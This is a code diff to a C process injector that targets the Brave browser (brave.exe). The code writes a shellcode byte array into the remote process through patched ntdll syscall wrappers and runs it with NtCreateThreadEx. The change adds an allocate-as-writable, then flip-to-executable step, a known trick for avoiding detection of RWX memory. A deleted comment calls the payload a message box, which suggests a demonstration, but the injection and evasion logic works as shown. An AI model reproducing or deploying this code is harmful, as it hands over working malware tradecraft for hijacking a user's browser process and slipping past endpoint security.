@@ -36,10 +36,9 @@ int injector() {
 	CLIENT_ID clientID;
 	SIZE_T writtenSize = NULL;
 	void* allocatedAddress = 0;
+	ULONG OldProtection = 0;
 
 	wchar_t targetExe[1][20] = { L"brave.exe" };
-
-	//message box payload
 	unsigned char shell[] =
 		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
 		"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
@@ -95,6 +94,8 @@ int injector() {
 	} while (Process32Next(hProcessSnap, &pe32));
 	CloseHandle(hProcessSnap);
 
+
+	
 	if (targetpid != 0) {
 
 		clientID.UniqueProcess = (HANDLE)targetpid;
@@ -109,9 +110,8 @@ int injector() {
 			printf("\n(+) Process opened successfully. Checking errors :%lu\n", GetLastError());
 		}
 		
-		patchFunc("ntdll.dll", "NtAllocateVirtualMemory");
-		FARPROC open = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
-		NTSTATUS allocateStatus = patchedFunction(hProcess, &allocatedAddress, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		patchFunc("ntdll.dll", "NtAllocateVirtualMemory");;
+		NTSTATUS allocateStatus = patchedFunction(hProcess, &allocatedAddress, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (allocateStatus != 0) {
 			printf("\n\n(!) Error allocating memory - 0x%x\n", allocateStatus);
 			return 1;
@@ -120,7 +120,6 @@ int injector() {
 		}
 		
 		patchFunc("ntdll.dll", "NtWriteVirtualMemory");
-		FARPROC write = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
 		NTSTATUS writeStatus = patchedFunction(hProcess, allocatedAddress, &shell, sizeof(shell), &writtenSize);
 		if (writeStatus != 0) {
 			printf("\n\n(!) Error writing memory - 0x%x\n", writeStatus);
@@ -129,6 +128,15 @@ int injector() {
 			printf("\n(+) Memory written successfully. Checking errors :%lu\n", GetLastError());
 		}
 		
+		patchFunc("ntdll.dll", "NtProtectVirtualMemory");
+		NTSTATUS protectStatus = patchedFunction(hProcess, &allocatedAddress, &allocatedSize, PAGE_EXECUTE_READ, &OldProtection);
+		if (protectStatus != 0) {
+			printf("\n\n(!) Error changing memory protection - 0x%x\n", protectStatus);
+			return 1;
+		} else {
+			printf("\n(+) Memory protection changed successfully. Checking errors :%lu\n", GetLastError());
+		}
+
 		patchFunc("ntdll.dll", "NtCreateThreadEx");
 		NTSTATUS createStatus = patchedFunction(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)allocatedAddress, NULL, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 		if (createStatus != 0) {
